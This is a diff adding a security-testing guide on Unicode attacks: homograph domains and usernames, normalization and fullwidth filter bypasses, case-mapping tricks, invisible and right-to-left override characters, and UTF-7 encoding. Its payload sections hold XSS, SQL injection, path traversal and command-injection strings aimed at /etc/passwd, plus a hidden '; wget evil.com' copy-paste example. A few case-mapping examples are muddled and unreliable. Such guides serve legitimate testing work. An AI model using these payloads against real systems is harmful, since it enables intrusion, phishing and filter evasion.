@@ -1,0 +1,493 @@
+<unicode_normalization_guide>
+<title>UNICODE SECURITY VULNERABILITIES</title>
+
+<critical>Unicode normalization and character handling create unique security vulnerabilities. Attacks include homograph attacks (IDN), normalization form bypasses, fullwidth character substitution, case mapping issues, and invisible character injection. These can bypass security filters, enable phishing, and cause logic errors.</critical>
+
+<scope>
+- Homograph attacks (IDN)
+- Normalization form bypasses (NFC, NFD, NFKC, NFKD)
+- Width attacks (fullwidth characters)
+- Case mapping vulnerabilities
+- Invisible character injection
+- Encoding confusion
+- Unicode canonicalization
+</scope>
+
+<methodology>
+1. Identify input processing that uses Unicode.
+2. Test normalization form handling.
+3. Probe for homograph character acceptance.
+4. Test case conversion vulnerabilities.
+5. Check for invisible character handling.
+6. Analyze string comparison logic.
+</methodology>
+
+<homograph_attacks>
+<idn_homographs>
+{% raw %}
+# Internationalized Domain Name (IDN) homographs:
+
+# Latin lookalikes from other scripts:
+# Cyrillic:
+а  # Cyrillic 'a' (U+0430) vs Latin 'a' (U+0061)
+е  # Cyrillic 'e' (U+0435) vs Latin 'e' (U+0065)
+о  # Cyrillic 'o' (U+043E) vs Latin 'o' (U+006F)
+р  # Cyrillic 'p' (U+0440) vs Latin 'p' (U+0070)
+с  # Cyrillic 'c' (U+0441) vs Latin 'c' (U+0063)
+х  # Cyrillic 'x' (U+0445) vs Latin 'x' (U+0078)
+
+# Greek:
+ο  # Greek omicron (U+03BF) vs Latin 'o'
+α  # Greek alpha (U+03B1) similar to Latin 'a'
+
+# Example phishing domains:
+аpple.com      # Cyrillic 'а'
+gооgle.com     # Cyrillic 'о'
+payраl.com     # Cyrillic 'р' and 'а'
+mіcrosoft.com  # Cyrillic 'і'
+
+# Punycode representation:
+xn--pple-43d.com  # аpple.com in punycode
+{% endraw %}
+</idn_homographs>
+
+<username_homographs>
+{% raw %}
+# Username/identifier homograph attacks:
+
+# Admin impersonation:
+аdmin     # Cyrillic 'а'
+adm𝗂n     # Mathematical sans-serif 'i'
+admіn     # Cyrillic 'і' (U+0456)
+
+# Lookalike usernames:
+john_smith
+jоhn_smith   # Cyrillic 'о'
+john_smіth   # Cyrillic 'і'
+
+# Numbers vs letters:
+O vs 0       # Capital O vs zero
+l vs 1 vs I  # lowercase L vs one vs uppercase i
+
+# Special characters:
+rn vs m      # 'rn' looks like 'm'
+vv vs w      # 'vv' looks like 'w'
+cl vs d      # 'cl' looks like 'd'
+{% endraw %}
+</username_homographs>
+</homograph_attacks>
+
+<normalization_bypass>
+<normalization_forms>
+{% raw %}
+# Unicode normalization forms:
+
+# NFC (Canonical Decomposition, followed by Canonical Composition):
+é  -> é (single character U+00E9)
+
+# NFD (Canonical Decomposition):
+é  -> e + ́ (U+0065 + U+0301)
+
+# NFKC (Compatibility Decomposition, followed by Canonical Composition):
+ﬁ  -> fi (ligature decomposed)
+① -> 1  (circled number to digit)
+
+# NFKD (Compatibility Decomposition):
+ﬁ  -> fi
+℃  -> °C
+
+# Attack: different forms compare differently
+# Before normalization:
+"café"  # NFC: é as single char
+"café"  # NFD: e + combining accent
+
+# String comparison may fail if not normalized consistently
+{% endraw %}
+</normalization_forms>
+
+<bypass_techniques>
+{% raw %}
+# Normalization-based filter bypass:
+
+# Script filter bypass:
+<scrіpt>  # Cyrillic 'і' instead of Latin 'i'
+<script>  # After NFKC normalization, both may be equivalent
+
+# Path traversal:
+../       # Normal
+．．/     # Fullwidth periods (NFKC → ..)
+‥/        # Two-dot leader (U+2025)
+
+# SQL injection:
+' ＯＲ 1=1  # Fullwidth 'OR' (NFKC → ' OR 1=1)
+
+# Command injection:
+; whoаmi   # Cyrillic 'а' in command
+
+# Null byte alternatives:
+Line separator (U+2028)
+Paragraph separator (U+2029)
+Zero-width space (U+200B)
+Zero-width non-joiner (U+200C)
+Zero-width joiner (U+200D)
+{% endraw %}
+</bypass_techniques>
+
+<comparison_issues>
+{% raw %}
+# String comparison vulnerabilities:
+
+# Case-insensitive comparison:
+# Some characters have complex case folding:
+ß -> SS (German sharp s)
+ı -> I  (Turkish dotless i)
+İ -> i  (Turkish dotted I)
+
+# Length changes after normalization:
+ﬁ -> fi     # 1 char -> 2 chars
+№ -> No     # 1 char -> 2 chars
+㎞ -> km    # 1 char -> 2 chars
+
+# Visual similarity after normalization:
+"admin" == "аdmin"  # After normalization may be true
+
+# Locale-dependent comparison:
+# Turkish: "I".lower() != "i" (it's "ı")
+# German: "ß".upper() == "SS"
+
+# Length-based validation bypass:
+# Input: 10 char limit
+# "ﬁﬁﬁﬁﬁﬁﬁﬁﬁﬁ" (10 ligatures)
+# After normalization: "fifififififififififi" (20 chars)
+{% endraw %}
+</comparison_issues>
+</normalization_bypass>
+
+<fullwidth_attacks>
+<fullwidth_characters>
+{% raw %}
+# Fullwidth character substitution:
+
+# ASCII fullwidth equivalents:
+Ａ (U+FF21) -> A
+ａ (U+FF41) -> a
+０ (U+FF10) -> 0
+＜ (U+FF1C) -> <
+＞ (U+FF1E) -> >
+／ (U+FF0F) -> /
+＼ (U+FF3C) -> \
+
+# XSS bypass:
+＜script＞alert(1)＜/script＞
+
+# Path traversal:
+．．／etc／passwd
+
+# Command injection:
+；cat ／etc／passwd
+
+# SQL injection:
+＇ ＯＲ ＇１＇＝＇１
+
+# URL bypass:
+ｈｔｔｐ：／／ｍａｌｉｃｉｏｕｓ．ｃｏｍ
+{% endraw %}
+</fullwidth_characters>
+
+<halfwidth_equivalents>
+{% raw %}
+# Halfwidth Katakana and other forms:
+
+# Halfwidth Katakana:
+ｱ ｲ ｳ ｴ ｵ  # vs Fullwidth: ア イ ウ エ オ
+
+# Currency symbols:
+₩ (won) -> W after NFKC
+¢ (cent) -> c (in some contexts)
+
+# Fraction forms:
+½ -> 1⁄2 -> 1/2
+¼ -> 1⁄4 -> 1/4
+
+# Superscripts/Subscripts:
+² -> 2 (after NFKC)
+₂ -> 2 (after NFKC)
+ⁿ -> n (after NFKC)
+{% endraw %}
+</halfwidth_equivalents>
+</fullwidth_attacks>
+
+<case_mapping>
+<case_vulnerabilities>
+{% raw %}
+# Case mapping vulnerabilities:
+
+# Turkish locale issues:
+# In Turkish:
+"I".lower() = "ı" (dotless i)
+"i".upper() = "İ" (dotted I)
+
+# Attack: bypass case-insensitive comparison
+# Target filter: blocks "ADMIN" case-insensitively
+# In Turkish locale:
+"ADMIN".lower() = "admın"  # With dotless i
+"admın" != "admin"  # Bypass!
+
+# German ß:
+"ß".upper() = "SS"
+"SS".lower() = "ss"
+# Round-trip changes the string!
+
+# Greek sigma:
+Σ (capital) -> σ (medial) or ς (final)
+# Context-dependent lowercasing
+
+# Cherokee script:
+# Has uppercase and lowercase with different code points
+{% endraw %}
+</case_vulnerabilities>
+
+<case_exploitation>
+{% raw %}
+# Exploiting case mapping:
+
+# Email address case:
+# Local part may be case-sensitive
+# Domain is case-insensitive
+admin@example.com
+Admin@example.com  # Same or different?
+
+# Username enumeration:
+# If system normalizes case:
+ADMIN and admin might be same user
+# Test with different case variations
+
+# Authorization bypass:
+# Resource: /Admin/dashboard (case-sensitive)
+# Test: /admin/dashboard, /ADMIN/dashboard
+
+# Parameter pollution:
+?user=ADMIN&user=admin
+# Which one is processed?
+
+# Turkish I problem in security:
+# Password: "PASSWORD"
+# Check: password.lower() == stored.lower()
+# In Turkish: "password" != "passWORd".lower()
+{% endraw %}
+</case_exploitation>
+</case_mapping>
+
+<invisible_characters>
+<zero_width_chars>
+{% raw %}
+# Zero-width and invisible characters:
+
+# Zero-width space (U+200B):
+admin​pass  # Has ZWSP between admin and pass
+
+# Zero-width non-joiner (U+200C):
+admin‌pass  # Has ZWNJ
+
+# Zero-width joiner (U+200D):
+admin‍pass  # Has ZWJ
+
+# Word joiner (U+2060):
+admin⁠pass  # Has WJ
+
+# Byte order mark (U+FEFF):
+﻿admin  # Has BOM prefix
+
+# Testing:
+# Strings look identical but compare different
+"admin" != "admin​"  # Second has ZWSP
+{% endraw %}
+</zero_width_chars>
+
+<invisible_exploitation>
+{% raw %}
+# Exploiting invisible characters:
+
+# Username collision:
+"admin" registered
+"admin​" # With ZWSP - different user!
+
+# Duplicate username attack:
+# Create "admin​" that looks like "admin"
+# Confuse support/monitoring
+
+# Log poisoning:
+# Inject invisible chars in logs
+# Make malicious entries look benign
+
+# Comment/code injection:
+// malicious​code  # Hidden in comment
+
+# Filename manipulation:
+# file.txt​.exe
+# Appears as file.txt, executes as .exe
+
+# Copy-paste attacks:
+# Text looks like: curl https://safe.com
+# Actually contains: curl https://safe.com​; wget evil.com
+
+# Filter bypass:
+# Filter blocks "script"
+# Payload: "scr​ipt" (with ZWSP)
+{% endraw %}
+</invisible_exploitation>
+
+<direction_override>
+{% raw %}
+# Bidirectional text override attacks:
+
+# Right-to-left override (U+202E):
+# Text appears reversed
+
+# Example filename:
+# Actual: "harmless‮fdp.exe"
+# Display: "harmlessexe.pdf"
+
+# Code display manipulation:
+# Make malicious code look benign
+
+# URL manipulation:
+# http://example.com‮moc.live/path
+# Displays reversed domain
+
+# Attack in messaging:
+# Message: "Download ‮fdp.esrever‬"
+# Shows: "Download reverse.pdf"
+
+# Characters:
+# U+202A: Left-to-right embedding
+# U+202B: Right-to-left embedding
+# U+202C: Pop directional formatting
+# U+202D: Left-to-right override
+# U+202E: Right-to-left override
+# U+2066: Left-to-right isolate
+# U+2067: Right-to-left isolate
+{% endraw %}
+</direction_override>
+</invisible_characters>
+
+<encoding_confusion>
+<encoding_attacks>
+{% raw %}
+# Encoding-related attacks:
+
+# UTF-8 overlong encoding (legacy):
+# 'A' normal: 0x41
+# Overlong 2-byte: 0xC1 0x81
+# Overlong 3-byte: 0xE0 0x81 0x81
+# Modern parsers reject, but legacy may accept
+
+# Invalid UTF-8 sequences:
+# 0xFF 0xFE (not valid UTF-8)
+# May cause parser errors or bypass
+
+# Encoding detection confusion:
+# Mix UTF-8 and Latin-1 in same document
+# Parser may misinterpret
+
+# Double encoding:
+# %252F = %2F (after decode) = / (after second decode)
+
+# Character set mismatch:
+# Declared: ISO-8859-1
+# Actual: UTF-8
+# Byte 0xC2 0xA0 (UTF-8 NBSP) 
+# Interpreted as two Latin-1 chars
+{% endraw %}
+</encoding_attacks>
+
+<charset_manipulation>
+{% raw %}
+# Character set manipulation:
+
+# HTTP header charset:
+Content-Type: text/html; charset=utf-7
+# UTF-7 can bypass filters:
++ADw-script+AD4-alert(1)+ADw-/script+AD4-
+# Decodes to: <script>alert(1)</script>
+
+# BOM-based detection:
+# UTF-8 BOM: EF BB BF
+# UTF-16 LE BOM: FF FE
+# UTF-16 BE BOM: FE FF
+
+# Meta charset override:
+<meta charset="utf-7">
++ADw-script+AD4-...
+
+# Mixed encoding injection:
+# Inject raw bytes that decode differently
+# depending on assumed charset
+{% endraw %}
+</charset_manipulation>
+</encoding_confusion>
+
+<common_payloads>
+{% raw %}
+# Homograph payloads:
+аdmin    # Cyrillic 'а'
+pаypal   # Cyrillic 'а'
+
+# Normalization bypass:
+＜script＞  # Fullwidth
+．．／      # Path traversal
+
+# Case mapping:
+ADMIN (Turkish locale)
+ß vs ss
+
+# Invisible characters:
+admin​  # With ZWSP (U+200B)
+test‮fdp.exe  # RLO
+
+# Encoding:
++ADw-script+AD4-  # UTF-7
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate homograph attack bypassing visual inspection.
+2. Show normalization-based filter bypass.
+3. Prove case mapping vulnerability with locale differences.
+4. Document invisible character injection.
+5. Provide specific Unicode code points used in attack.
+</validation>
+
+<false_positives>
+- Proper Unicode normalization before comparison
+- Homograph detection in domain names
+- Stripping of zero-width characters
+- Locale-aware case comparison
+- IDN restriction to single script
+- Consistent encoding handling
+</false_positives>
+
+<impact>
+- Phishing via lookalike domains/usernames
+- Authentication and authorization bypass
+- Filter and WAF evasion
+- Log poisoning and forensic evasion
+- Data integrity issues
+- User confusion and social engineering
+</impact>
+
+<pro_tips>
+1. Always test with Cyrillic lookalike characters.
+2. Check if normalization happens before or after validation.
+3. Test fullwidth equivalents for special characters.
+4. Use online Unicode analyzers to identify character codes.
+5. Test invisible character insertion in all string inputs.
+6. Check for RTL override in filenames and messages.
+7. Verify case comparison is locale-independent.
+8. Test encoding detection with mixed encodings.
+9. Look for length validation before normalization.
+10. Document exact Unicode code points for reproducibility.
+</pro_tips>
+
+<remember>Unicode security issues stem from the gap between visual representation and actual byte content. What looks identical may be different, and what looks different may be equivalent after normalization. Always test with various Unicode representations of the same visual content.</remember>
+</unicode_normalization_guide>
